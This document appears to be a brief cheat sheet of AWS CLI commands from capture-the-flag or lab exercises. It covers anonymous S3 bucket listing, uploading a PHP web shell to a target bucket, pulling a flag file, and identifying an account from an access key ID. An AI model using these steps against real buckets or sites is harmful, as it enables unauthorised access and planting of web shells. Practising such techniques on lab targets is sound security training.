# AWS

List contents of a bucket

aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request

aws --endpoint=http://s3.thetoppers.htb s3 ls

List under specified bucket

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb



Upload PHP shell to S3 bucket

aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb



Download via curl

aws s3 cp --no-sign-request

aws s3 cp s3://images.bestfestivalcompany.com/flag.txt . --no-sign-request



Get AWS account ID

aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile lab



Get AWS username

aws sts get-caller-identity --profile lab
